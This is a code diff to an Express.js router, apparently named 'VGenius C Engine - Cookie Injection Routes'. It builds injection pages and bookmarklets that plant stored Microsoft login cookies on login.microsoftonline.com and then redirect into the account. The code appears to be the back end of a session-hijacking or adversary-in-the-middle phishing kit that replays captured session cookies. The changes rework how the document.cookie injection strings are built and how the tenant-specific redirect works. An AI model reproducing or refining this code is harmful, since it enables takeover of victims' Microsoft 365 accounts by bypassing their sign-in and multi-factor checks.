@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Cookie Injection Routes
- * Uses our proven method: load Microsoft page, inject cookies, redirect
+ * Uses competitor's proven method: load Microsoft page, inject cookies, redirect
  */
 const express = require('express');
 const router = express.Router();
@@ -100,23 +100,15 @@ router.get('/raw/:id', async (req, res) => {
       }
     }
 
-    var cookieString = '';
-    var expires = new Date();
-    expires.setFullYear(expires.getFullYear() + 100);
-    var expStr = expires.toUTCString();
-
+    var cookieString = [];
     for (var i = 0; i < cookiesList.length; i++) {
-      var c = cookiesList[i];
-      cookieString += c.name + '=' + encodeURIComponent(c.value);
-      cookieString += '; domain=' + (c.domain || '.login.microsoftonline.com');
-      cookieString += '; path=/; ';
-      cookieString += 'expires=' + expStr + '; ';
-      cookieString += 'SameSite=None; Secure; ';
+      const c = cookiesList[i];
+      cookieString.push(`document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";`);
     }
 
     res.json({
       success: true,
-      cookie_string: cookieString.trim().slice(0, -2),
+      cookie_string: cookieString.join(''),
       cookie_count: cookiesList.length,
       cookies: cookiesList
     });
@@ -191,7 +183,7 @@ function generateInjectPage(cookies, clientId, tenant) {
   html += '  <script>\n';
   html += '    function startInjection() {\n';
   html += '      setStatus("Opening Microsoft login page...", "info");\n';
-  html += '      window.location.href = "https://login.microsoftonline.com/";\n';
+  html += '      window.location.href = "https://login.microsoftonline.com/' + tenant + '/";\n';
   html += '    }\n';
   html += '    function setStatus(msg, type) {\n';
   html += '      document.getElementById("status").className = "status " + type;\n';
@@ -249,17 +241,17 @@ router.get('/bookmarklet/:id', async (req, res) => {
     var tenant = token.tenant || config.AZURE_TENANT || 'common';
     var clientId = token.client_id || config.AZURE_CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 
-    // Build bookmarklet code using document.cookie method
-    var bookmarklet = 'javascript:(function(){';
-    bookmarklet += 'var cookies=' + JSON.stringify(cookiesList) + ';';
-    bookmarklet += 'cookies.forEach(function(c){';
-    bookmarklet += 'var domain=c.domain||".login.microsoftonline.com";';
-    bookmarklet += 'document.cookie=c.name+"="+c.value+"; domain="+domain+"; path=/; Secure; SameSite=None";';
-    bookmarklet += '});';
-    bookmarklet += 'setTimeout(function(){';
-    bookmarklet += 'window.location.href="https://login.microsoftonline.com/' + tenant + '/oauth2/v2.0/authorize?client_id=' + clientId + '&redirect_uri=https://www.office.com/&response_type=code&scope=openid%20profile%20email";';
-    bookmarklet += '},2000);';
-    bookmarklet += '})()';
+    // Build bookmarklet code using document.cookie method 
+    var bookmarklet = '';
+    for (var i = 0; i < cookiesList.length; i++) {
+      const c = cookiesList[i];
+      bookmarklet += `document.cookie = "${c.name}=${encodeURIComponent(c.value)}; domain=${c.domain}; path=/; Secure; SameSite=None";\n`;
+    }
+    bookmarklet += '\n';
+    bookmarklet += '// Redirect after 3s\n';
+    bookmarklet += 'setTimeout(() => {\n';
+    bookmarklet += '  window.location.href = "https://login.microsoftonline.com/?auth=2";\n';
+    bookmarklet += '}, 3000);\n';
 
     res.json({ bookmarklet: bookmarklet, cookies: cookiesList });
   } catch (err) {
